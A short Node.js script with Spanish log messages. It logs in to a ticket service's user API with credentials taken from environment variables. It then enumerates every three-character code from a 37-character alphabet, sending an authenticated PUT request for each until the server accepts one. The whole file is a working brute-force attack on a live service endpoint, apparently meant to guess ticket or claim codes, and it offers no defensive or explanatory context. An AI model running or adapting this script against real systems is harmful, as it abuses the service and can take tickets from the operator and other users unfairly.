import axios from "axios";
import dotenv from "dotenv";
dotenv.config();

const api = axios.create({
    baseURL: "https://api.unticketparabernabeu.com/usuario/"
});

const options = ["1","2","3","4","5","6","7","8","9","0","A","B","C","D","E","F","G","H","I","J","K","L","M","N","Ñ","O","P","Q","R","S","T","U","V","W","X","Y","Z"]

const login = async (email, clave) => {
    try {
        const response = await api.post("login", { email, clave });
        return response.data;
    } catch (error) {
        return error.response.data;
    }
}

//run main
const getTokenAndID = async () => {
    const email = process.env.EMAIL;
    const clave = process.env.PASSWORD;
    const response = await login(email, clave);
    const {token,id} = response;
    return {token,id}
}


const putApi = async (url, token) => {
    try {
        const response = await api.put(url, {}, {
            headers: {
                Authorization: `Bearer ${token}`
            }
        });
        return response.status === 200;
    } catch (error) {
        return false
    }
}

const main = async () => {
    const {token, id} = await getTokenAndID();
    let responseResult = '';
    let urlResult = '';
    console.log(id)
    const year = process.env.YEAR;
    
    for (let i = options.length - 1; i >= options.length/2 - 1; i--) {
        for (let j = options.length - 1; j >= 0; j--) {
            for (let k = options.length - 1; k >= 0; k--) {
                const url = `${id}/${year}/${options[i]}${options[j]}${options[k]}`;
                const response = await putApi(url, token);
                console.log(url)
                if (response) {
                    console.log(`La url ${url} fue exitosa`);
                    responseResult = response;
                    urlResult = url;
                    break;
                }
            }
            if (responseResult) {
                break;
            }
        }
        if (responseResult) {
            break;
        }
    }
    console.log(responseResult);
    console.log(urlResult);
    if (!responseResult) {
        console.log("No se encontró ninguna url exitosa")
    }
}

main();
